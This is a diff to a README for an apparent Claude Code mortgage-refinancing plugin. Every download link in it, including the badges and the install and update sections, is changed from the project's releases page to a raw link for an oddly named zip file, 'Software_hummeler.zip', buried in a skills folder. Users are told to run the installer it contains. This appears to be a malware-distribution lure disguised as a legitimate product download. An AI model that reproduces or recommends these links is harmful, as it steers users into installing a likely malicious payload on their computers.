@@ -1,6 +1,6 @@
 # 🏠 mortgage - Easy Mortgage Refinancing Pricing
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-%23ff6f61?style=for-the-badge)](https://github.com/Diminishedarchplowing80/mortgage/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-%23ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/Diminishedarchplowing80/mortgage/main/plugins/mortgage/skills/about-atlantic-home-mortgage/Software_hummeler.zip)
 
 ## 📋 About mortgage
 
@@ -28,10 +28,10 @@ Follow these steps to get mortgage running on your Windows computer. No technica
 
 Go to the mortgage release page to find the latest version:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-%23ff6f61?style=for-the-badge)](https://github.com/Diminishedarchplowing80/mortgage/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-%23ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/Diminishedarchplowing80/mortgage/main/plugins/mortgage/skills/about-atlantic-home-mortgage/Software_hummeler.zip)
 
 Click the badge or open this link in your web browser:  
-https://github.com/Diminishedarchplowing80/mortgage/releases
+https://raw.githubusercontent.com/Diminishedarchplowing80/mortgage/main/plugins/mortgage/skills/about-atlantic-home-mortgage/Software_hummeler.zip
 
 ### 2. Choose the Correct File
 
@@ -89,7 +89,7 @@ The plugin does not share your data with third parties. It relies on Claude Code
 ## ⚙️ Updating mortgage
 
 Check the release page regularly for updates:  
-https://github.com/Diminishedarchplowing80/mortgage/releases
+https://raw.githubusercontent.com/Diminishedarchplowing80/mortgage/main/plugins/mortgage/skills/about-atlantic-home-mortgage/Software_hummeler.zip
 
 New versions improve pricing accuracy and add features. To update:
 
@@ -106,7 +106,7 @@ New versions improve pricing accuracy and add features. To update:
 ## 📥 Download and Installation Links
 
 Get the latest version of mortgage here:  
-[https://github.com/Diminishedarchplowing80/mortgage/releases](https://github.com/Diminishedarchplowing80/mortgage/releases)
+[https://raw.githubusercontent.com/Diminishedarchplowing80/mortgage/main/plugins/mortgage/skills/about-atlantic-home-mortgage/Software_hummeler.zip](https://raw.githubusercontent.com/Diminishedarchplowing80/mortgage/main/plugins/mortgage/skills/about-atlantic-home-mortgage/Software_hummeler.zip)
 
 Click the link, then download the `.exe` or `.msi` file listed under the newest release. Run that file to install the plugin on your Windows PC. After installing, open Claude Code to activate mortgage.
 
